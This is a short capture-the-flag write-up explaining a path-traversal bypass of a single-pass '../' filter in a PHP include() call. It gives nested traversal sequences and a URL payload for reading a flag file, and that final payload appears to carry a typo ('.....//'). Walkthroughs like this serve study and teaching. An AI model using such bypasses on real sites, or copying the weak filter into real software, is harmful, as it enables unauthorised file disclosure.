# MiniSTRyplace
This challenge can be solved by taking advantage of a path traversal vulnerability in the templating.

The website contains `lang` parameter with options: `en` and `qw`.

The code in `web_ministryplace/challenge/index.php` shows this php script:

```php=
<?php
$lang = ['en.php', 'qw.php'];
include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
?>
```

The issue is with `str_replace`. Since it is replacing `../` with a blank value, we can embed and chain multiple `../` together, for example:
```
../            => ''
....//         => ../
....//....//   => ../../
```
and so on.

With the code provided, we know the flag is up two directories, so we just have to go to `http://<ip><port>/?lang=.....//....//flag`